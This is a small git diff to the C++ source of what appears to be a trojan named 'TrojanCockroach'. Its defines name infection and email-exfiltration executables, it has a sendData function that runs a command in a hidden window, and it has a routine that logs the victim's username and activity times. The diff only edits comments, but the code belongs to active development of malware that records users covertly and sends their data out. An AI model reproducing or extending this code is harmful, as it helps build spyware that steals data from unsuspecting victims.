@@ -16,7 +16,7 @@ using namespace std;
 #define RUN_LINK_NAME "TrojanCockroach.lnk"
 #define INFECT_FILE_NAME "Infect.exe"
 #define INFECT_LINK_NAME "Infect.lnk"
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"
+#define EMAIL_SENDER_FILE_NAME "Transmit.exe" // Comming soon
 
 #define MIN_RECORD_SIZE 20 
 #define LIFE_TIME 5 
@@ -133,9 +133,6 @@ void sendData(){
     WinExec(command, SW_HIDE);
 }
 
-/**
- * Record username, time, and date.
-**/
 void logUserTime(){
     FILE *file = fopen(FILE_NAME, "a");
 
